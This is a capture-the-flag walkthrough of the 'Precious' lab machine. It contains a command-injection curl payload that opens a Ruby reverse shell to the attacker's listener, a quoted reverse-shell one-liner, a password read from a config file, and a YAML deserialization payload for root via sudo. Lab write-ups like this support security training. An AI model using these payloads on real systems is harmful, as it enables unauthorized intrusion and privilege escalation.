# Precious

![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/95ee232f-ce38-42aa-b5e1-60f94804129d)

## Difficulty = Easy
---
Run your nmap scan:

```sh
# Nmap 7.94 scan initiated Sat Aug 12 04:11:57 2023 as: nmap -sVC --min-rate=1000 -T4 --script vuln -oN nmap.txt -v 10.10.11.189
Nmap scan report for 10.10.11.189
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.4p1: 
|     	CVE-2021-28041	4.6	https://vulners.com/cve/CVE-2021-28041
|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2016-20012	4.3	https://vulners.com/cve/CVE-2016-20012
|_    	CVE-2021-36368	2.6	https://vulners.com/cve/CVE-2021-36368
80/tcp open  http    nginx 1.18.0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 12 04:23:23 2023 -- 1 IP address (1 host up) scanned in 686.08 seconds
```

Nothing seems to be interesting in our nmap scan, so let navigate to port 80/http :

![](https://i.imgur.com/xheYSoH.png)

Looks like we have a web page that convert websites to PDF's, i wasn't sure enough, so i used wappalyzer to check technologies :

![](https://i.imgur.com/fepM8Ky.png)

First of all enumerating `phushion passenger 6.0.15 exploit`, Nothing seems to be interesting than a privilege escalation vector which is after we have foothold, we don't have that yet :

![](https://i.imgur.com/TVBdAQD.png)

Enumerating `nginx 1.18.0 exploit` doesn't to have any connection to what i want, i need something like command injection exploit :

![](https://i.imgur.com/PwbZGVG.png)

---

I then decided to load a URL on the site again, for this you have to start a python http server:

- Touch a txt file on your terminal `touch bankai.txt`
- then start up the python web server with `python3 -m http.server 80`

![](https://i.imgur.com/drwrQTn.png)

Now click submit

- I noticed the site is downloading a PDF once we submit the URL

![](https://i.imgur.com/J7z1gEe.png)

- so i opened the PDF and nothing was there, then decided to use `exiftool` to check any meta-data and i got a version of what is generating this PDF for us :

![](https://i.imgur.com/MWH53Hj.png)

Nice😘

Now let enumerate this version 

![](https://i.imgur.com/EFfPt9U.png)

Looks like we are getting somewhere, after scraping around, i found a way to get shell with this syntax:

*Instructions :*

- Start a python http server with `python3 -m http.server 80`
- start your netcat listener `nc -lvnp 4444`
- Then use this payload on you command line :

```sh
curl 'TARGET_ADDRESS' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: TARGET_ADDRESS' -H 'Connection: keep-alive' -H 'Referer: TARGET_ADDRESS' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-ADDRESS%22%2CLOCAL-PORT%29%29%27%60'
```

- Make sure to replace `TARGET_ADDRESS`, `LOCAL_ADDRESS` and `LOCAL_PORT` with their respective info, fire it up and things should work :

![](https://i.imgur.com/Nv0JhuD.png)

> POV : it looks like we still got reverse shell with ruby cos' the `--data-raw` header makes a request to execute this ruby command as a reverse shell -->
> `ruby -rsocket -e 'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.12",4444))'


### Privilege Escalation

- Navigating to the home directory, we have an unusual file called `.bundle`

![](https://i.imgur.com/Jtqq5dq.png)

- Inside .bundle is a config file, concatenating the config file gives us Henry password

![](https://i.imgur.com/nvy95vG.png)

- Successfully switched user to henry, running `sudo -l` tells us we can run `/opt/update_dependencies.rb` as root

![](https://i.imgur.com/ifmdF8Z.png)

- Running the files seems to give me errors, so i changed directory to /opt
- We can see that we have another directory here which has a `dependencies.yml` file

![](https://i.imgur.com/sbkhfCp.png)

- Making my research i saw we can update privileges by editing this file
- We also don't have write access to this `dependencies.yml` file which is a problem
- One more problem, if your shell gives you problem, login via SSH with Henry and the password we got.

![](https://i.imgur.com/jpoQonU.png)

- After much enumeration, i found out i could create a `dependencies.yml` file in /tmp too and it will be read, So;
- change directory to /tmp --> `cd /tmp`
- then do --> `nano dependencies.yml`

- Now paste this code directly and do `ctrl+x` to save

```YML
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: /bin/bash
         method_id: :resolve
```

- Now run the file with `sudo /usr/bin/ruby /opt/update_dependencies.rb` 

![](https://i.imgur.com/65JDjk3.png)

Booyah 😅, and we are root

<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>

